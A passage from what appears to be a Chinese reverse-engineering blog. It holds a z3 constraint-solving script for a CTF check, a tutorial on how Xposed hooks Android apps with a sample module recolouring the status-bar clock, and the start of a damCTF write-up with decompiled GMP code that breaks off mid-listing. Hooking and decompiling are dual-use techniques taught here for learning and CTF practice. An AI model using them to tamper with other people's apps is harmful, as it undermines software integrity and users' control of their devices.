<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">x = [BitVec(<span class="string">&#x27;x%i&#x27;</span>%i,<span class="number">32</span>) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>)]</span><br><span class="line">s = Solver()</span><br><span class="line">s.add(x[<span class="number">0</span>]==<span class="number">0xDF48EF7E</span>)</span><br><span class="line">s.add(x[<span class="number">1</span>]==<span class="number">0x20CAACF4</span>)</span><br><span class="line">s.add(x[<span class="number">5</span>]==<span class="number">0x84F30420</span>)</span><br><span class="line">s.add(x[<span class="number">2</span>]-x[<span class="number">3</span>]==<span class="number">0x84A236FF</span>)</span><br><span class="line">s.add(x[<span class="number">3</span>]+x[<span class="number">4</span>]==<span class="number">0xFA6CB703</span>)</span><br><span class="line">s.add(x[<span class="number">2</span>]-x[<span class="number">4</span>]==<span class="number">0x42D731A8</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">x[3]-x[4]=0x42d731a8-0x84a236ff</span></span><br><span class="line"><span class="string">x[3] = (0x42d731a8-0x84a236ff+0xfa6cb703)/2;</span></span><br><span class="line"><span class="string">x[2] = x[3]+0x84a236ff;</span></span><br><span class="line"><span class="string">x[4] = 0xfa6cb703-x[3];</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">res = []</span><br><span class="line"><span class="keyword">while</span> s.check()==sat:</span><br><span class="line">    m = s.model()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> x:</span><br><span class="line">        res.append(m[i].as_long())</span><br><span class="line">    print(m)</span><br></pre></td></tr></table></figure>


      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-note/rev/rev-3" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2020/10/14/note/rev/rev-3/" class="article-date">
  	<time datetime="2020-10-14T02:43:20.000Z" itemprop="datePublished">2020-10-14</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/10/14/note/rev/rev-3/">
        Xposed学习--工作原理
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="Xposed工作原理"><a href="#Xposed工作原理" class="headerlink" title="Xposed工作原理"></a>Xposed工作原理</h2><h3 id="zygote进程"><a href="#zygote进程" class="headerlink" title="zygote进程"></a>zygote进程</h3><p>Android运行的心脏。每一个应用都是这个进程的fork，都从这个进程的一个fork开始。</p>
<p>Android系统启动时，zygote进程被/init.rc脚本启动。当/system/bin/app_process加载完成时，zygote启动完成。/system/bin/app_process负责加载必要的类和调用初始化方法。</p>
<h3 id="Xposed"><a href="#Xposed" class="headerlink" title="Xposed"></a>Xposed</h3><p>安装xposed后，会复制一份扩展后的app_process到/system/bin，这个app_process会添加一个额外的jar到classpath并且在特定的地方调用方法。</p>
<p>举个例子，当虚拟机创建后，在zygote的main函数执行之前，或者main函数中，xposed时zygote的一部分并且可以控制上下文。</p>
<p>jar位于<code>/data/data/de.robv.android.xposed.installer/bin/XposedBridge.jar</code>。</p>
<p>使用Xposed可以hook方法，在方法前后注入代码。</p>
<p>XposedBridge还有native方法hookMethodNative，会将某个方法改成native并且把方法link到自己的native方法。</p>
<h2 id="Xposed入门示例"><a href="#Xposed入门示例" class="headerlink" title="Xposed入门示例"></a>Xposed入门示例</h2><ol>
<li><p>新建Android Studio工程，选择空白activity</p>
</li>
<li><p>下载<a target="_blank" rel="noopener" href="https://github.com/rovo89/XposedBridge/wiki/Using-the-Xposed-Framework-API">xposedAPI</a>，放在工程的libs目录下</p>
</li>
<li><p>改动build.gradle(:app)，如果有implementation fileTree()就换成compileOnly，如果没有就添加一行compileOnly</p>
<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">apply <span class="attr">plugin:</span> <span class="string">&#x27;com.android.application&#x27;</span></span><br><span class="line"></span><br><span class="line">android &#123;</span><br><span class="line">    compileSdkVersion <span class="number">30</span></span><br><span class="line">    buildToolsVersion <span class="string">&quot;30.0.2&quot;</span></span><br><span class="line"></span><br><span class="line">    defaultConfig &#123;</span><br><span class="line">        applicationId <span class="string">&quot;com.example.redclocknew&quot;</span></span><br><span class="line">        minSdkVersion <span class="number">20</span></span><br><span class="line">        targetSdkVersion <span class="number">30</span></span><br><span class="line">        versionCode <span class="number">1</span></span><br><span class="line">        versionName <span class="string">&quot;1.0&quot;</span></span><br><span class="line"></span><br><span class="line">        testInstrumentationRunner <span class="string">&quot;androidx.test.runner.AndroidJUnitRunner&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    buildTypes &#123;</span><br><span class="line">        release &#123;</span><br><span class="line">            minifyEnabled <span class="literal">false</span></span><br><span class="line">            proguardFiles getDefaultProguardFile(<span class="string">&#x27;proguard-android-optimize.txt&#x27;</span>), <span class="string">&#x27;proguard-rules.pro&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">dependencies &#123;</span><br><span class="line"><span class="comment">//    implementation fileTree(dir: &quot;libs&quot;, include: [&quot;*.jar&quot;])</span></span><br><span class="line">    compileOnly fileTree(<span class="attr">dir:</span> <span class="string">&#x27;libs&#x27;</span>, <span class="attr">include:</span> [<span class="string">&#x27;*.jar&#x27;</span>])</span><br><span class="line">    implementation <span class="string">&#x27;androidx.appcompat:appcompat:1.2.0&#x27;</span></span><br><span class="line">    testImplementation <span class="string">&#x27;junit:junit:4.12&#x27;</span></span><br><span class="line">    androidTestImplementation <span class="string">&#x27;androidx.test.ext:junit:1.1.2&#x27;</span></span><br><span class="line">    androidTestImplementation <span class="string">&#x27;androidx.test.espresso:espresso-core:3.3.0&#x27;</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>编辑AndroidManifest.xml，添加一系列meta-data，比如我的是这样</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">manifest</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">package</span>=<span class="string">&quot;com.example.redclocknew&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">application</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:allowBackup</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:icon</span>=<span class="string">&quot;@mipmap/ic_launcher&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:label</span>=<span class="string">&quot;@string/app_name&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:roundIcon</span>=<span class="string">&quot;@mipmap/ic_launcher_round&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:supportsRtl</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:theme</span>=<span class="string">&quot;@style/AppTheme&quot;</span> &gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta-data</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:name</span>=<span class="string">&quot;xposedmodule&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:value</span>=<span class="string">&quot;true&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta-data</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:name</span>=<span class="string">&quot;xposeddescription&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:value</span>=<span class="string">&quot;Easy example which makes the status bar clock red and adds a smiley&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta-data</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:name</span>=<span class="string">&quot;xposedminversion&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:value</span>=<span class="string">&quot;53&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">application</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>创建类，添加代码，示例如下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.redclocknew;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> de.robv.android.xposed.XposedHelpers.findAndHookMethod;</span><br><span class="line"><span class="keyword">import</span> android.graphics.Color;</span><br><span class="line"><span class="keyword">import</span> android.widget.TextView;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.IXposedHookLoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodHook;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedBridge;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage.LoadPackageParam;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RedClock</span> <span class="keyword">implements</span> <span class="title">IXposedHookLoadPackage</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">handleLoadPackage</span><span class="params">(LoadPackageParam lpparam)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!lpparam.packageName.equals(<span class="string">&quot;com.android.systemui&quot;</span>))</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line"><span class="comment">//        XposedBridge.log(&quot;Loaded app: &quot; + lpparam.packageName);</span></span><br><span class="line">        findAndHookMethod(<span class="string">&quot;com.android.systemui.statusbar.policy.Clock&quot;</span>, lpparam.classLoader, <span class="string">&quot;updateClock&quot;</span>, <span class="keyword">new</span> XC_MethodHook() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line"></span><br><span class="line">                TextView tv = (TextView) param.thisObject;</span><br><span class="line">                String text = tv.getText().toString();</span><br><span class="line">                tv.setText(text + <span class="string">&quot;🍖&quot;</span>);</span><br><span class="line">                tv.setTextColor(Color.RED);</span><br><span class="line">                <span class="keyword">if</span>(text!=<span class="keyword">null</span>&amp;&amp;text.length()&gt;<span class="number">0</span>)&#123;</span><br><span class="line">                    <span class="keyword">char</span> c = text.charAt(text.length()-<span class="number">1</span>);</span><br><span class="line">                    <span class="keyword">if</span>((c&amp;<span class="number">1</span>)!=<span class="number">0</span>)&#123;</span><br><span class="line">                        tv.setText(text+<span class="string">&quot;🍭&quot;</span>);</span><br><span class="line">                        tv.setTextColor(Color.GREEN);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>添加assets/xposed_init文本文件，在文件中添加你的完整类名，比如我的是</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">com.example.redclocknew.RedClock</span><br></pre></td></tr></table></figure>
</li>
<li><p>工具栏build-&gt;build apk(s)</p>
</li>
<li><p>找到对应的apk，使用</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb install 文件名</span><br></pre></td></tr></table></figure>

<p>进行安装</p>
</li>
<li><p>重启手机，愉快体验</p>
</li>
</ol>
<h2 id="自定义Xposed模块"><a href="#自定义Xposed模块" class="headerlink" title="自定义Xposed模块"></a>自定义Xposed模块</h2><p>根据Xposed实现原理，大概的替换思路有了：找到要hook的方法，然后利用xposedhook该方法并且实施自己要做的动作。</p>
<p>找源码有两种方式，反编译和阅读源码(如果有)</p>
<p>相关资料</p>
<ol>
<li><p><a target="_blank" rel="noopener" href="https://ibotpeaches.github.io/Apktool/">apktool</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="http://java-decompiler.github.io/">jd-gui</a> or <a target="_blank" rel="noopener" href="https://github.com/deathmarine/Luyten">luyten</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://github.com/pxb1988/dex2jar">dex2java</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://source.android.com/setup/build/downloading">下载android源码</a> or <a target="_blank" rel="noopener" href="http://grepcode.com/snapshot/repository.grepcode.com/java/ext/com.google.android/android/4.0.3_r1/">here</a></p>
</li>
<li><p><a href="androidxrefx.com">在线查看android源码</a></p>
</li>
<li><p>获取系统中指定App安装包的方法</p>
<ol>
<li><p>获取栈顶activity(当前界面所属activity)</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">adb shell dumpsys window | findstr mCurrentFocus</span><br><span class="line"><span class="comment"># or</span></span><br><span class="line">adb shell dumpsys activity | findstr mFucusedActivity</span><br></pre></td></tr></table></figure>
</li>
<li><p>获取app文件安装路径</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell pm path com.test</span><br></pre></td></tr></table></figure>

<ul>
<li>/system/app rom附带软件</li>
<li>/system/priv-app 手机厂商定制软件</li>
<li>/data/app 用户安装软件</li>
</ul>
</li>
<li><p>使用pull命令获取应用</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb pull path_to_apk path_to_store</span><br></pre></td></tr></table></figure>

<p>使用push命令可以存储应用</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb push path_to_file path_on_phone</span><br></pre></td></tr></table></figure>

</li>
</ol>
</li>
</ol>
<p>找到可以修改的点和相关函数，注意xposed只能hook函数。</p>
<p>使用下面的代码确定相关app是否存在</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">handleLoadPackage</span><span class="params">(LoadPackageParam lpparam)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!lpparam.packageName.equals(<span class="string">&quot;com.android.systemui&quot;</span>))</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    XposedBridge.log(<span class="string">&quot;we are in SystemUI!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用findAndHook方法hook方法→_→</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> de.robv.android.xposed.mods.tutorial;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> de.robv.android.xposed.XposedHelpers.findAndHookMethod;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.IXposedHookLoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodHook;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage.LoadPackageParam;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Tutorial</span> <span class="keyword">implements</span> <span class="title">IXposedHookLoadPackage</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">handleLoadPackage</span><span class="params">(<span class="keyword">final</span> LoadPackageParam lpparam)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">    	<span class="keyword">if</span> (!lpparam.packageName.equals(<span class="string">&quot;com.android.systemui&quot;</span>))</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">    	</span><br><span class="line">    	findAndHookMethod(<span class="string">&quot;com.android.systemui.statusbar.policy.Clock&quot;</span>, lpparam.classLoader, <span class="string">&quot;updateClock&quot;</span>, <span class="keyword">new</span> XC_MethodHook() &#123;</span><br><span class="line">    		<span class="meta">@Override</span></span><br><span class="line">    		<span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">    			<span class="comment">// this will be called before the clock was updated by the original method</span></span><br><span class="line">    		&#125;</span><br><span class="line">    		<span class="meta">@Override</span></span><br><span class="line">    		<span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">    			<span class="comment">// this will be called after the clock was updated by the original method</span></span><br><span class="line">    		&#125;</span><br><span class="line">	&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>[1] <a target="_blank" rel="noopener" href="https://github.com/rovo89/XposedBridge/wiki/Development-tutorial">Xposed turtorial</a></p>
<p>[2] <a target="_blank" rel="noopener" href="https://jsonchao.github.io/2019/02/24/Android%E7%B3%BB%E7%BB%9F%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B%E4%B9%8BZygote%E8%BF%9B%E7%A8%8B%E5%90%AF%E5%8A%A8/">Android系统启动流程之Zygote启动</a></p>
<p>[3] <a target="_blank" rel="noopener" href="https://blog.csdn.net/song_lee/article/details/105048406">adb获取手机中已安装app的按转包</a></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-note/rev/rev-2" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2020/10/14/note/rev/rev-2/" class="article-date">
  	<time datetime="2020-10-14T02:13:31.000Z" itemprop="datePublished">2020-10-14</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/10/14/note/rev/rev-2/">
        平方求幂&amp;damCTF tracing-into-the-night wp
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="平方求幂算法"><a href="#平方求幂算法" class="headerlink" title="平方求幂算法"></a>平方求幂算法</h2><p>平方求幂算法是一种快速计算一个数的幂次的方法<br>$$<br>x^n=\begin{cases}<br>x^{\frac{n}{2}}\ if\ x\ is\ odd\<br>x\times x^{\frac{n-1}{2}}\ if \ x\ is\ even<br>\end{cases}<br>$$<br>利用这个规律可以递归求一个数的整数幂次。普通求幂复杂度为$O(n)$，该算法复杂度为$O(log_2n)$</p>
<h2 id="tracing-into-the-night-wp"><a href="#tracing-into-the-night-wp" class="headerlink" title="tracing-into-the-night wp"></a>tracing-into-the-night wp</h2><p>使用ida静态分析，可以看到一些函数无法识别，但是看到了长长的十进制字符串，猜测是gnump库。进入gdb调试，有函数名，标注进IDA，得到如下反编译代码。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rbp</span></span><br><span class="line">  __int64 *v4; <span class="comment">// rsi</span></span><br><span class="line">  __int64 v5; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// ST0C_4</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v7; <span class="comment">// rdi</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v9; <span class="comment">// rsi</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v10; <span class="comment">// rt1</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp-658h] [rbp-658h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> j; <span class="comment">// [rsp-654h] [rbp-654h]</span></span><br><span class="line">  <span class="keyword">int</span> k; <span class="comment">// [rsp-650h] [rbp-650h]</span></span><br><span class="line">  __int64 *input_num; <span class="comment">// [rsp-648h] [rbp-648h]</span></span><br><span class="line">  __int64 *v15; <span class="comment">// [rsp-640h] [rbp-640h]</span></span><br><span class="line">  __int64 mpz_n; <span class="comment">// [rsp-638h] [rbp-638h]</span></span><br><span class="line">  __int64 mpz_t1; <span class="comment">// [rsp-628h] [rbp-628h]</span></span><br><span class="line">  <span class="keyword">mpz_t</span> mpz_t_input; <span class="comment">// [rsp-618h] [rbp-618h]</span></span><br><span class="line">  __int64 mpz_res; <span class="comment">// [rsp-608h] [rbp-608h]</span></span><br><span class="line">  __int64 *v20; <span class="comment">// [rsp-600h] [rbp-600h]</span></span><br><span class="line">  __int64 input; <span class="comment">// [rsp-5F8h] [rbp-5F8h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v22; <span class="comment">// [rsp-10h] [rbp-10h]</span></span><br><span class="line">  __int64 v23; <span class="comment">// [rsp-8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  __asm &#123; endbr64 &#125;</span><br><span class="line">  v23 = v3;</span><br><span class="line">  v22 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>, argv, envp);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%1499s&quot;</span>, &amp;input);</span><br><span class="line">  gmpz_inits(&amp;mpz_n, &amp;mpz_t1, &amp;mpz_t_input, <span class="number">0L</span>L);</span><br><span class="line">  gmpz_set_str(</span><br><span class="line">    &amp;mpz_n,</span><br><span class="line">    <span class="string">&quot;44718451071997505459737203382097036763157674563410285094015196661873160587515660365739479080754310646285927975698840&quot;</span></span><br><span class="line">    <span class="string">&quot;75919491076155228633904614970948895838322855053680110252775015931685739923032704890382246914424506867596898917291406&quot;</span></span><br><span class="line">    <span class="string">&quot;11332152177145996284158921291450051409647476573907180263447394788228251424280628988395605571911678859197411847278057&quot;</span></span><br><span class="line">    <span class="string">&quot;91400587658248775006672823048997257062183136366283575435863850765350233224739628379263972613356404602105716389643245&quot;</span></span><br><span class="line">    <span class="string">&quot;17304756914352778058093193795607623318712943463163160677253581696533782339191585362014857109889012022353032581293578&quot;</span></span><br><span class="line">    <span class="string">&quot;60206058478283916330455251797686976821594656048049233954144004025483722105654884172390572538592913614550964028742160&quot;</span></span><br><span class="line">    <span class="string">&quot;90293906545836344587821140092248468913058755753661122747418378547696731251743370151912439465855419692768832807886171&quot;</span></span><br><span class="line">    <span class="string">&quot;61119953930555532581063235725600001511098008638586065561150355649771521595492214987293575278242808126982207431794687&quot;</span></span><br><span class="line">    <span class="string">&quot;22094175413271548368111459152019209395355285403167321317054983346720908955526763883023592954877344827198138450778799&quot;</span></span><br><span class="line">    <span class="string">&quot;84586727200403718241500034435659943656658321479270769282796202188603446386026445427003762433292713575110502402853472&quot;</span></span><br><span class="line">    <span class="string">&quot;3013339718674741591919194067341852869368415679054292752733683732089731387&quot;</span>,</span><br><span class="line">    <span class="number">10L</span>L);</span><br><span class="line">  gmpz_set_str(</span><br><span class="line">    &amp;mpz_t1,</span><br><span class="line">    <span class="string">&quot;20619486314897341844318499801192377793444872681514265976447810269422099657211923575185395447621708419343082909350420&quot;</span></span><br><span class="line">    <span class="string">&quot;44722984884526242093626873391758965963625822281049298074982301079998961895199836931743163026038825656545514475458669&quot;</span></span><br><span class="line">    <span 